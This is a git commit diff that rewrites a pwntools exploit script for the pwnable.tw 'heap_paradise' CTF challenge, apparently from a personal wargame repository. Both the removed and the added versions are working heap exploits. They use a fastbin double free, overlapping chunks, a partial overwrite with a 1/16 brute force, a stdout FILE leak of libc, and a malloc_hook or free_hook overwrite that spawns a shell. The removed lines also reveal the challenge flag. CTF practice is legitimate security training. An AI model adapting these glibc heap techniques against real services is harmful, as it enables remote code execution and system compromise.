b73ef634880cf807aac01b6ad020c706c984ac2b
Alessio Ciccola <alessio.ciccola@gmail.com>
2022-07-14 13:44:42 +0200

    pwnable.tw challenge exploit fixed

--- pwnable.tw/heap_paradise/heap_paradise.py
+++ pwnable.tw/heap_paradise/heap_paradise.py
@@ -1,80 +1,86 @@
 from pwn import *
 
-elf = ELF("./heap_paradise")
-libc = ELF("./libc_64.so.6")
-context.binary = elf
-flag = 0
-while flag == 0:
-    r = remote('chall.pwnable.tw', 10308)
+# context.log_level="debug"
+def alloc(size, data):
+    p.sendlineafter(b'You Choice:', b'1')
+    p.sendlineafter(b'Size :', str(size).encode())
+    p.sendafter(b'Data :', data)
+
+def free(idx):
+    p.sendlineafter(b'You Choice:', b'2')
+    p.sendlineafter(b'Index :', str(idx).encode())
 
 
-    def sla(string, val):
-        r.sendlineafter(string, val)
+elf = ELF("heap_paradise")
+libc = ELF("libc_64.so.6")
+p = remote('chall.pwnable.tw', 10308)
+# p = process('./heap_paradise', env={'LD_PRELOAD': './libc_64.so.6'})
+
+with log.progress("Stage 1: Producing 0x70 fastbin") as l:
+	alloc(0x40, b'a' * 0x38 + p64(0x51))
+	alloc(0x40, (p64(0) + p64(0x21)) * 4)
+	alloc(0x60, (p64(0) + p64(0x21)) * 6)
+
+	free(0)
+	free(1)
+	free(0)
+
+	alloc(0x40, b'\x40')
+	alloc(0x40, b'b')
+	alloc(0x40, b'a')
+	alloc(0x40, p64(0) + p64(0x71))
+
+	# Produce 0x70 fastbin
+	free(1)
+	l.success()
+
+with log.progress("Stage 2: Producing unsorted bin overlapping with 0x70 fastbin") as l:
+	# Produce unsorted bin overlapping with 0x70 fastbin
+	free(6)
+	alloc(0x40, p64(0) + p64(0x91))
+
+	free(1)
+	l.success()
+# Now we have a unsorted bin, fd & bk are libc address.
+# Partially overwrite this address to address before stdout (Must meet size constraint, of course)
+
+with log.progress("Stage 3: Leaking libc address") as l:
+	log.info("Exploit will success with 1/16 prob")
+	free(6)
+	alloc(0x40, p64(0) + p64(0x71) + b'\xdd\x95')
+
+		# Exploit will success with 1/16 prob.
+
+		# Overwrite stdout, leak libc address
+	alloc(0x60, b'a')
+	alloc(0x60, b'b' * 0x33 + p64(0xfbad1800) + p64(0) + p64(0) + p64(0) + b'\x88')
+
+	leak=u64(p.recv(8))
+	libc = leak - 0x3c38e0
+
+	log.info(f'leak: {hex(leak)}')
+
+		# Overwrite hook
+	one_gadget_offset = [0x45216, 0x4526a, 0xef6c4, 0xf0567]
+	malloc_hook = libc + 0x3c3b10
+	one_gadget = libc + one_gadget_offset[3]
+	log.info(f"malloc_hook: {hex(malloc_hook)}")
+	log.info(f'one_gadget: {hex(one_gadget)}')
+	l.success(hex(libc))
 
 
-    def sa(string, val):
-        r.sendafter(string, val)
+with log.progress("Stage 4: Overwriting malloc_hook") as l:
+	free(1)
+	free(2)
+	free(1)
 
+	alloc(0x60, p64(malloc_hook - 0x23))
+	alloc(0x60, b'a')
+	alloc(0x60, b'a')
+	alloc(0x60, b'a' * 0x13 + p64(one_gadget))
 
-    def add(size, data="A"):
-        sla("Choice:", str(1))
-        sla("Size :", str(size))
-        sa("Data :", data)
+	p.sendlineafter(b'You Choice:', b'1')
+	p.sendlineafter(b'Size :', b'1')
+	l.success()
 
-
-    def delete(index):
-        sla("Choice:", str(2))
-        sla("Index :", str(index))
-
-
-    payload = p64(0) * 3 + p64(0x71)
-    add(0x68, payload)  # 0
-    payload = p64(0x21) * 13
-    add(0x68, payload)  # 1
-    payload = p64(0) * 3 + p64(0x21) * 10
-    add(0x68, payload)  # 2
-    delete(0)
-    delete(1)
-    delete(0)
-    payload = b"\x20"
-    add(0x68, payload)  # 3
-    add(0x68)  # 4
-    add(0x68)  # 5
-    payload = p64(0) * 9 + p64(0xa1)
-    add(0x68, payload)  # 6
-    delete(1)
-    delete(6)
-    payload = p64(0) * 9 + p64(0x71) + b"\xdd\x25"  # 4 bit libc brute force
-    try:
-        add(0x68, payload)  # 7
-    except:
-        r.close()
-        continue
-    delete(0)
-    delete(6)
-    delete(0)
-    payload = p64(0) * 3 + p64(0x71) + b"\x70"
-    add(0x68, payload)  # 8
-    add(0x68)  # 9
-    add(0x68)  # 10
-    payload = b"A" * 0x33 + p32(0xfbad1801) + b";sh\x00" + p64(0) * 3 + b"\x00"
-    sleep(5)
-    add(0x68, payload)  # 11
-    libc_base = u64(r.recv(0x48)[0x40:0x48]) - 0x3c4600
-    libc_system = libc_base + libc.symbols["system"]
-    if libc_base % 0x1000 == 0:
-        flag = 1
-    else:
-        r.close()
-        continue
-    delete(1)
-    delete(6)
-    payload = p64(0) * 9 + p64(0x71) + p64(libc_base + 0x3c46bd)
-    add(0x68, payload)  # 12
-    add(0x68)  # 13
-    payload = b"\x00" * 0x2b + p64(libc_base + 0x3c46c8) + p64(libc_system)
-    add(0x68, payload)  # 14
-
-    r.interactive()
-
-# FLAG --> FLAG{W3lc0m3_2_h3ap_p4radis3}
+p.interactive()
